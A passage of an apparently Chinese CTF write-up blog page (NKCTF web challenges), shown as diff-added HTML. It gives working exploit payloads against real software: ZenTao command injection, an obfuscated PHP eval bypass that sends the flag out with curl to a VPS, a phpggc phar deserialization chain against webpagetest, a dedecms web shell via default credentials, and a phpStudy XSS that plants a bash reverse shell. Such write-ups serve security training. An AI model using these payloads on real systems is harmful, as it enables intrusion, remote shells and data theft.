class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:url+<span class="string">&quot;/repo-edit-1-0.html&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;SCM=Subversion&amp;client=`tac /f*|base64`&#x27;</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = s.get(url1,proxies=proxies,timeout=<span class="number">5</span>,verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line">        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="number">5</span>,verify=<span class="literal">False</span>,headers=headers2)</span><br><span class="line">        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="number">5</span>,verify=<span class="literal">False</span>,headers=headers2)</span><br><span class="line">        <span class="built_in">print</span>(req4.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> <span class="keyword">in</span> req4.text:</span><br><span class="line">            <span class="built_in">print</span>(url,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(req4.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(check(<span class="string">&quot;http://1e43db25-38e4-4fd7-b7d3-bd7ba773eb58.node2.yuzhian.com.cn/&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// not only ++</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;NKCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$NK</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;NKCTF&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$NK</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$NK</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$NK</span>) &lt; <span class="number">105</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$NK</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟ctfshow之前举办的一个极限rce挑战很像</p>
+<p>直接上payload，要用burp发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%91=phpinfo&amp;%92=1&amp;NKCTF=$_=(%99/%99.%99)[_];$%81=%2b%2b$_;$%81=_.%2b%2b$_.$%81[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_;$$%81[%91]($$%81[%92]);</span><br></pre></td></tr></table></figure>
+
+<p>但是查看phpinfo可以发现他过滤了几个函数<code>passthru,exec,system</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261734406.png" title="image-20230326173351704" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261734406.png" alt="image-20230326173351704"></a></p>
+<p>没有过滤<code>shell_exec</code></p>
+<p>因为这个不会回显，所以通过wget或者curl的方法来外带数据到vps上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://vps:ip/`ls`</span><br><span class="line">curl http://vps:ip/`cat /f*|base64`</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%91=shell_exec&amp;%92=curl http://vps:ip/`cat /f*|base64`&amp;NKCTF=$_=(%99/%99.%99)[_];$%81=%2b%2b$_;$%81=_.%2b%2b$_.$%81[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_;$$%81[%91]($$%81[%92]);</span><br></pre></td></tr></table></figure>
+
+<p>在burp里面要将空格进行url编码</p>
+<p>vps开启监听，然后发包，在vps里可以获得flag</p>
+<h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>他的反序列化漏洞，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11798">webpagetest反序列化及ssrf漏洞分析</a></p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a>后，直接跟着文章的内容打就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Monolog/RCE2 system <span class="string">&#x27;cat /f*&#x27;</span> -p phar -o testinfo.ini</span><br><span class="line"><span class="comment">#进行url编码</span></span><br><span class="line">URLENC_PAYLOAD=$(<span class="built_in">cat</span> testinfo.ini | xxd -p | <span class="built_in">tr</span> -d <span class="string">&quot;\n&quot;</span> | sed <span class="string">&quot;s#..#%&amp;#g&quot;</span>)</span><br><span class="line"><span class="comment">#写入文件</span></span><br><span class="line">curl -sSkig <span class="string">&#x27;http://737a43c3-7c8c-4a50-a4ea-230507a1d702.node2.yuzhian.com.cn/runtest.php&#x27;</span> -d <span class="string">&#x27;rkey=gadget&#x27;</span> -d <span class="string">&quot;ini=<span class="variable">$URLENC_PAYLOAD</span>&quot;</span> -o -</span><br><span class="line"><span class="comment">#触发反序列化</span></span><br><span class="line">curl -sSkig <span class="string">&#x27;http://737a43c3-7c8c-4a50-a4ea-230507a1d702.node2.yuzhian.com.cn/runtest.php&#x27;</span> -d <span class="string">&#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27;</span> -d <span class="string">&quot;ini=<span class="variable">$URLENC_PAYLOAD</span>&quot;</span> -o -</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261744803.png" title="image-20230326174415718" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261744803.png" alt="image-20230326174415718"></a></p>
+<h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>dedecms</p>
+<p>找到后台路径<code>/dede</code></p>
+<p>dedecms的默认密码为<code>admin/admin</code>，直接登录</p>
+<p>直接上传文件写马会被检测，又网上找了好多种后台getshell方法，但是都不如意</p>
+<p>最后还是使用写马的方式，利用字符串拼接来绕过检测</p>
+<p>在这里可以大概知道他会检测什么</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261746384.png" title="image-20230326174636307" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261746384.png" alt="image-20230326174636307"></a></p>
+<p>然后在文件式管理器上传文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261747257.png" title="image-20230326174726180" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261747257.png" alt="image-20230326174726180"></a></p>
+<p>发现他会过滤file_put_contents等一些函数，我记得在做的时候是使用字符串拼接来执行和file_put_contents来写文件执行命令的，但是在写wp的时候不知道为什么就不行了XD</p>
+<p>因为是ctf，所以只要得到flag就行</p>
+<p>新建以下文件</p>
+<p>查看flag名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261937758.png" title="image-20230326193758690" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261937758.png" alt="image-20230326193758690"></a></p>
+<p>读取flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/f1Aggg&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261938852.png" title="image-20230326193849811" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261938852.png" alt="image-20230326193849811"></a></p>
+<h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮面板rce，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128954060">【漏洞复现】phpStudy 小皮 Windows面板 RCE漏洞</a></p>
+<p>打开靶机会显示404</p>
+<p>本地安装一下小皮面板，对登录进行抓包，发现有个<code>X-Requested-With: XMLHttpRequest</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261909388.png" title="image-20230326190909293" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261909388.png" alt="image-20230326190909293"></a></p>
+<blockquote>
+<p>这种头部带上X-Requested-With:XMLHttpRequest的是 Ajax 异步请求。</p>
+</blockquote>
+<p>所以加上这个http头，可以发现正常回显</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261911270.png" title="image-20230326191148188" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261911270.png" alt="image-20230326191148188"></a></p>
+<p>然后就是要上面文章里的poc</p>
+<p>直接使用bash来弹shell</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params"></span>)&#123;</span><br><span class="line">  $.<span class="title function_">get</span>(<span class="string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> id=data.<span class="property">data</span>[<span class="number">0</span>].<span class="property">ID</span>;</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">tid</span>:id</span><br><span class="line">    &#125;,<span class="keyword">function</span>(<span class="params">res2</span>)&#123;</span><br><span class="line">        $.<span class="title function_">post</span>(<span class="string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,<span class="keyword">function</span>(<span class="params">res3</span>)&#123;&#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">    &#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">  &#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">save</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> data=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">  data.<span class="property">task_id</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  data.<span class="property">title</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">  data.<span class="property">exec_cycle</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">  data.<span class="property">week</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">  data.<span class="property">day</span>=<span class="string">&quot;3&quot;</span>;</span><br><span class="line">  data.<span class="property">hour</span>=<span class="string">&quot;14&quot;</span>;</span><br><span class="line">  data.<span class="property">minute</span> = <span class="string">&quot;20&quot;</span>;</span><br><span class="line">  data.<span class="property">shell</span>=<span class="string">&#x27;bash -c&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>;</span><br><span class="line">  $.<span class="title function_">post</span>(<span class="string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">    <span class="title function_">poc</span>();</span><br><span class="line">  &#125;,<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">save</span>();</span><br></pre></td></tr></table></figure>
+
+<p>然后把文件放在vps里，用python开启一个简易服务，<code>python3 -m -http.server</code></p>
+<p>然后在登录框内，用户名填写为<code>&lt;script src=&quot;http://vpsip:port/shell.js&quot;&gt;&lt;/script&gt;</code>，密码随便填，然后vps开启监听，等bot登录，就会执行shell.js来创建一个计划任务，从而反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261919442.png" title="image-20230326191906374" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261919442.png" alt="image-20230326191906374"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261921758.png" title="image-20230326192117721" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261921758.png" alt="image-20230326192117721"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261921935.png" title="image-20230326192138896" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303261921935.png" alt="image-20230326192138896"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
